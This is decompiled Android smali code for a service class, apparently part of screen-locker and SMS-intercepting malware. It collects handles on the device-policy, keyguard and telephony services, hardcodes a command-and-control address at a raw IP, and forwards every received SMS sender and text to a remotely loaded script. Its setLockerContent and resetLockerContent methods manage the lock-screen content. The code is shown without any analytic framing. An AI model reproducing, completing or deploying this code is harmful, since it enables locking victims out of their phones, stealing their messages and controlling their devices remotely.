.method public onSMSReceived(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;
    .locals 5
    .param p1, "num"    # Ljava/lang/String;
    .param p2, "text"    # Ljava/lang/String;

    .prologue
    const/4 v4, 0x1

    .line 645
    :try_start_0
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "SMS Received: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, " text: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lorg/luckybird/core/Log;->write(Ljava/lang/String;)V

    .line 646
    invoke-virtual {p0}, Lorg/luckybird/core/RunService;->getScriptLoader()Lorg/luckybird/core/ScriptLoader;

    move-result-object v0

    const-string v1, "onSMS"

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    aput-object p1, v2, v3

    const/4 v3, 0x1

    aput-object p2, v2, v3

    invoke-virtual {v0, v1, v2}, Lorg/luckybird/core/ScriptLoader;->call(Ljava/lang/String;[Ljava/lang/Object;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 652
    :goto_0
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    return-object v0

    .line 648
    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 6
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .prologue
    const/4 v5, 0x1

    .line 450
    :try_start_0
    sput-object p0, Lorg/luckybird/core/RunService;->_service:Lorg/luckybird/core/RunService;

    .line 452
    const-string v1, "Started service"

    invoke-static {v1}, Lorg/luckybird/core/Log;->write(Ljava/lang/String;)V

    .line 453
    const-string v1, "power"

    invoke-virtual {p0, v1}, Lorg/luckybird/core/RunService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/os/PowerManager;

    sput-object v1, Lorg/luckybird/core/RunService;->_pm:Landroid/os/PowerManager;

    .line 454
    const-string v1, "phone"

    invoke-virtual {p0, v1}, Lorg/luckybird/core/RunService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/telephony/TelephonyManager;

    sput-object v1, Lorg/luckybird/core/RunService;->_telemgr:Landroid/telephony/TelephonyManager;

    .line 455
    const-string v1, "activity"

    invoke-virtual {p0, v1}, Lorg/luckybird/core/RunService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/ActivityManager;

    sput-object v1, Lorg/luckybird/core/RunService;->_actmgr:Landroid/app/ActivityManager;

    .line 456
    const-string v1, "keyguard"

    invoke-virtual {p0, v1}, Lorg/luckybird/core/RunService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/KeyguardManager;

    sput-object v1, Lorg/luckybird/core/RunService;->_keyguard:Landroid/app/KeyguardManager;

    .line 457
    const-string v1, "notification"

    invoke-virtual {p0, v1}, Lorg/luckybird/core/RunService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/NotificationManager;

    sput-object v1, Lorg/luckybird/core/RunService;->_notify:Landroid/app/NotificationManager;

    .line 458
    const-string v1, "device_policy"

    invoke-virtual {p0, v1}, Lorg/luckybird/core/RunService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/admin/DevicePolicyManager;

    sput-object v1, Lorg/luckybird/core/RunService;->_policy:Landroid/app/admin/DevicePolicyManager;

    .line 459
    const-string v1, "connectivity"

    invoke-virtual {p0, v1}, Lorg/luckybird/core/RunService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/net/ConnectivityManager;

    sput-object v1, Lorg/luckybird/core/RunService;->_connectivity:Landroid/net/ConnectivityManager;

    .line 460
    const-string v1, "wifi"

    invoke-virtual {p0, v1}, Lorg/luckybird/core/RunService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/net/wifi/WifiManager;

    sput-object v1, Lorg/luckybird/core/RunService;->_wifimgr:Landroid/net/wifi/WifiManager;

    .line 461
    const-string v1, "alarm"

    invoke-virtual {p0, v1}, Lorg/luckybird/core/RunService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/AlarmManager;

    sput-object v1, Lorg/luckybird/core/RunService;->_alarm:Landroid/app/AlarmManager;

    .line 464
    new-instance v1, Lorg/luckybird/core/SMSHandler;

    invoke-direct {v1}, Lorg/luckybird/core/SMSHandler;-><init>()V

    iput-object v1, p0, Lorg/luckybird/core/RunService;->_sms_handler:Lorg/luckybird/core/SMSHandler;

    .line 465
    new-instance v1, Lorg/luckybird/core/sms/SentReceiver;

    invoke-direct {v1}, Lorg/luckybird/core/sms/SentReceiver;-><init>()V

    iput-object v1, p0, Lorg/luckybird/core/RunService;->_sms_sent_receiver:Lorg/luckybird/core/sms/SentReceiver;

    .line 466
    new-instance v1, Lorg/luckybird/core/sms/DeliveredReceiver;

    invoke-direct {v1}, Lorg/luckybird/core/sms/DeliveredReceiver;-><init>()V

    iput-object v1, p0, Lorg/luckybird/core/RunService;->_sms_delivered_receiver:Lorg/luckybird/core/sms/DeliveredReceiver;

    .line 468
    new-instance v1, Lorg/luckybird/core/Settings;

    invoke-direct {v1}, Lorg/luckybird/core/Settings;-><init>()V

    sput-object v1, Lorg/luckybird/core/RunService;->_settings:Lorg/luckybird/core/Settings;

    .line 469
    new-instance v1, Lorg/luckybird/core/xAPI;

    sget-object v2, Lorg/luckybird/core/RunService;->_hash:Ljava/lang/String;

    sget-object v3, Lorg/luckybird/core/RunService;->_telemgr:Landroid/telephony/TelephonyManager;

    invoke-direct {v1, v2, v3}, Lorg/luckybird/core/xAPI;-><init>(Ljava/lang/String;Landroid/telephony/TelephonyManager;)V

    sput-object v1, Lorg/luckybird/core/RunService;->_api:Lorg/luckybird/core/xAPI;

    .line 470
    new-instance v1, Lorg/luckybird/core/ScriptLoader;

    invoke-direct {v1}, Lorg/luckybird/core/ScriptLoader;-><init>()V

    sput-object v1, Lorg/luckybird/core/RunService;->_loader:Lorg/luckybird/core/ScriptLoader;

    .line 473
    invoke-virtual {p0}, Lorg/luckybird/core/RunService;->getSettings()Lorg/luckybird/core/Settings;

    move-result-object v1

    const-string v2, "srv"

    const-string v3, "http://192.227.137.154/request.php"

    invoke-virtual {v1, v2, v3}, Lorg/luckybird/core/Settings;->set(Ljava/lang/String;Ljava/lang/String;)V

    .line 474
    invoke-virtual {p0}, Lorg/luckybird/core/RunService;->getSettings()Lorg/luckybird/core/Settings;

    move-result-object v1

    const-string v2, "srv"

    invoke-virtual {v1, v2}, Lorg/luckybird/core/Settings;->get(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lorg/luckybird/core/Network;->init(Ljava/lang/String;)V

    .line 477
    iget-object v1, p0, Lorg/luckybird/core/RunService;->_client:Lcom/esotericsoftware/kryonet/Client;

    invoke-virtual {v1}, Lcom/esotericsoftware/kryonet/Client;->start()V

    .line 479
    iget-object v1, p0, Lorg/luckybird/core/RunService;->_client:Lcom/esotericsoftware/kryonet/Client;

    new-instance v2, Lorg/luckybird/core/RunService$2;

    invoke-direct {v2, p0}, Lorg/luckybird/core/RunService$2;-><init>(Lorg/luckybird/core/RunService;)V

    invoke-virtual {v1, v2}, Lcom/esotericsoftware/kryonet/Client;->addListener(Lcom/esotericsoftware/kryonet/Listener;)V

    .line 552
    invoke-virtual {p0}, Lorg/luckybird/core/RunService;->netConnect()V

    .line 568
    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    sput-object v1, Lorg/luckybird/core/RunService;->_started:Ljava/lang/Boolean;

    .line 570
    sget-object v1, Lorg/luckybird/core/RunService;->onTickHandler:Landroid/os/Handler;

    const/4 v2, 0x2

    const-wide/16 v3, 0x3e8

    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->sendEmptyMessageDelayed(IJ)Z

    .line 573
    sget-object v1, Lorg/luckybird/core/RunService;->onTickHandler:Landroid/os/Handler;

    const/16 v2, 0x22b

    const-wide/16 v3, 0x64

    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->sendEmptyMessageDelayed(IJ)Z

    .line 576
    sget-object v1, Lorg/luckybird/core/RunService;->onTickHandler:Landroid/os/Handler;

    const/16 v2, 0x29a

    const-wide/16 v3, 0x3e8

    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->sendEmptyMessageDelayed(IJ)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 586
    :goto_0
    return v5

    .line 582
    :catch_0
    move-exception v0

    .line 584
    .local v0, "e":Ljava/lang/Exception;
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "onStartExc: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v0}, Ljava/lang/Exception;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " stack: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lorg/luckybird/core/Log;->write(Ljava/lang/String;)V

    goto :goto_0
.end method

.method public resetLockerContent()V
    .locals 3

    .prologue
    .line 292
    invoke-virtual {p0}, Lorg/luckybird/core/RunService;->getSettings()Lorg/luckybird/core/Settings;

    move-result-object v0

    const-string v1, "lockerContent"

    const-string v2, ""

    invoke-virtual {v0, v1, v2}, Lorg/luckybird/core/Settings;->set(Ljava/lang/String;Ljava/lang/String;)V

    .line 293
    invoke-virtual {p0}, Lorg/luckybird/core/RunService;->getSettings()Lorg/luckybird/core/Settings;

    move-result-object v0

    const-string v1, "lockerContentType"

    const-string v2, ""

    invoke-virtual {v0, v1, v2}, Lorg/luckybird/core/Settings;->set(Ljava/lang/String;Ljava/lang/String;)V

    .line 294
    return-void
.end method

.method public sendNetPacket(Ljava/lang/Object;)V
    .locals 7
    .param p1, "o"    # Ljava/lang/Object;

    .prologue
    .line 196
    :try_start_0
    invoke-virtual {p0}, Lorg/luckybird/core/RunService;->netConnect()V

    .line 197
    iget-object v3, p0, Lorg/luckybird/core/RunService;->_client:Lcom/esotericsoftware/kryonet/Client;

    invoke-virtual {v3}, Lcom/esotericsoftware/kryonet/Client;->isConnected()Z

    move-result v3

    if-eqz v3, :cond_2

    .line 199
    iget-object v3, p0, Lorg/luckybird/core/RunService;->_client:Lcom/esotericsoftware/kryonet/Client;

    invoke-virtual {v3, p1}, Lcom/esotericsoftware/kryonet/Client;->sendTCP(Ljava/lang/Object;)I

    .line 208
    :cond_0
    :goto_0
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Sent: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    move-object v0, p1

    check-cast v0, Ljava/lang/String;

    move-object v3, v0

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lorg/luckybird/core/Log;->write(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 219
    :goto_1
    iget-object v3, p0, Lorg/luckybird/core/RunService;->_client:Lcom/esotericsoftware/kryonet/Client;

    invoke-virtual {v3}, Lcom/esotericsoftware/kryonet/Client;->isConnected()Z

    move-result v3

    if-nez v3, :cond_1

    .line 223
    :try_start_1
    new-instance v2, Ljava/lang/String;

    check-cast p1, Ljava/lang/String;

    .end local p1    # "o":Ljava/lang/Object;
    const/4 v3, 0x2

    invoke-static {p1, v3}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([B)V

    .line 225
    .local v2, "json":Ljava/lang/String;
    const-string v3, "get_action"

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-nez v3, :cond_1

    const-string v3, "sms_status"

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-nez v3, :cond_1

    .line 227
    invoke-virtual {p0}, Lorg/luckybird/core/RunService;->getScriptLoader()Lorg/luckybird/core/ScriptLoader;

    move-result-object v3

    const-string v4, "onSendNotConnected"

    const/4 v5, 0x1

    new-array v5, v5, [Ljava/lang/Object;

    const/4 v6, 0x0

    aput-object v2, v5, v6

    invoke-virtual {v3, v4, v5}, Lorg/luckybird/core/ScriptLoader;->call(Ljava/lang/String;[Ljava/lang/Object;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 235
    .end local v2    # "json":Ljava/lang/String;
    :cond_1
    :goto_2
    return-void

    .line 203
    .restart local p1    # "o":Ljava/lang/Object;
    :cond_2
    :try_start_2
    sget-object v3, Lorg/luckybird/core/RunService;->_queue:Ljava/util/Queue;

    invoke-interface {v3, p1}, Ljava/util/Queue;->contains(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_0

    .line 205
    sget-object v3, Lorg/luckybird/core/RunService;->_queue:Ljava/util/Queue;

    invoke-interface {v3, p1}, Ljava/util/Queue;->add(Ljava/lang/Object;)Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_0

    .line 210
    :catch_0
    move-exception v1

    .line 212
    .local v1, "e":Ljava/lang/Exception;
    sget-object v3, Lorg/luckybird/core/RunService;->_queue:Ljava/util/Queue;

    invoke-interface {v3, p1}, Ljava/util/Queue;->contains(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_3

    .line 214
    sget-object v3, Lorg/luckybird/core/RunService;->_queue:Ljava/util/Queue;

    invoke-interface {v3, p1}, Ljava/util/Queue;->add(Ljava/lang/Object;)Z

    .line 216
    :cond_3
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    .line 217
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "sendNetPacket: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lorg/luckybird/core/Log;->write(Ljava/lang/String;)V

    goto :goto_1

    .line 230
    .end local v1    # "e":Ljava/lang/Exception;
    .end local p1    # "o":Ljava/lang/Object;
    :catch_1
    move-exception v3

    goto :goto_2
.end method

.method public setLockerContent(Ljava/lang/String;Ljava/lang/Boolean;)V
    .locals 3
    .param p1, "urlOrData"    # Ljava/lang/String;
    .param p2, "isData"    # Ljava/lang/Boolean;

    .prologue
    .line 273
    invoke-virtual {p0}, Lorg/luckybird/core/RunService;->getSettings()Lorg/luckybird/core/Settings;

    move-result-object v0

    const-string v1, "lockerContent"

    invoke-virtual {v0, v1, p1}, Lorg/luckybird/core/Settings;->set(Ljava/lang/String;Ljava/lang/String;)V

    .line 274
    invoke-virtual {p2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 275
    invoke-virtual {p0}, Lorg/luckybird/core/RunService;->getSettings()Lorg/luckybird/core/Settings;

    move-result-object v0

    const-string v1, "lockerContentType"

    const-string v2, "data"

    invoke-virtual {v0, v1, v2}, Lorg/luckybird/core/Settings;->set(Ljava/lang/String;Ljava/lang/String;)V

    .line 278
    :goto_0
    return-void

    .line 277
    :cond_0
    invoke-virtual {p0}, Lorg/luckybird/core/RunService;->getSettings()Lorg/luckybird/core/Settings;

    move-result-object v0

    const-string v1, "lockerContentType"

    const-string v2, ""

    invoke-virtual {v0, v1, v2}, Lorg/luckybird/core/Settings;->set(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0
.end method

.method public test(Ljava/lang/String;)V
    .locals 1
    .param p1, "msg"    # Ljava/lang/String;

    .prologue
    .line 608
    const/4 v0, 0x1

    invoke-static {p0, p1, v0}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 609
    return-void
.end method
